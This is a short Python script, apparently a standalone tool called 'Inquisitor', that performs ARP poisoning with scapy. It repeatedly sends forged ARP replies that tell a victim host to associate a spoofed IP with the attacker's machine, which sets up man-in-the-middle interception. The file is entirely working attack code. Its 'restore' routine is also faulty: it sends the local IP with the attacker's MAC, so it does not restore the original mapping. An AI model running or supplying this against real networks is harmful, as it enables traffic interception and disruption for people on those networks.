import sys
import time
import argparse
from scapy.all import ARP, send, get_if_addr


def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore_arp(target_ip, target_mac, source_mac):
    source_ip = get_if_addr("eth0")
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False)

def main():
    parser = argparse.ArgumentParser(prog="Inquisitor", description="ARP poisoning")
    parser.add_argument("IPsrc", type=str, help="the IP to spoof (IP spoof)")
    parser.add_argument("MACsrc", type=str, help="the attacker's MAC (your MAC address)")
    parser.add_argument("IPtarget", type=str, help="the victim's IP address")
    parser.add_argument("MACtarget", type=str, help="the victim's MAC")
    args = parser.parse_args()
    try:
        while True:
            print("Spoofing...")
            arp_spoof(args.IPtarget, args.IPsrc, args.MACtarget)
            time.sleep(1)
    except KeyboardInterrupt:
        restore_arp(args.IPtarget, args.MACtarget, args.MACsrc)
        print("[C^] Attack closed")

if __name__ == "__main__":
    sys.exit(main())